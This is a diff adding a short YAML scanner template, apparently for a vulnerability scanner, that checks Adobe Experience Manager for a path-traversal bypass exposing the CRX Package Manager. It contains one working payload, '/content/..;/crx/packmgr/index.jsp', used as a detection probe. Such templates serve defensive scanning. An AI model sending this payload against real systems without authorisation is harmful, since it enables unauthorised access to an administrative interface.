@@ -1,0 +1,13 @@
+request:
+  paths: true
+  payloads:
+  - /content/..;/crx/packmgr/index.jsp
+response:
+  patterns:
+  - CRX Package Manager
+  statusCode: 200
+template:
+  author: zoidsec
+  description: AEM CRX Path Traversal
+  name: aem-traversal
+  severity: medium
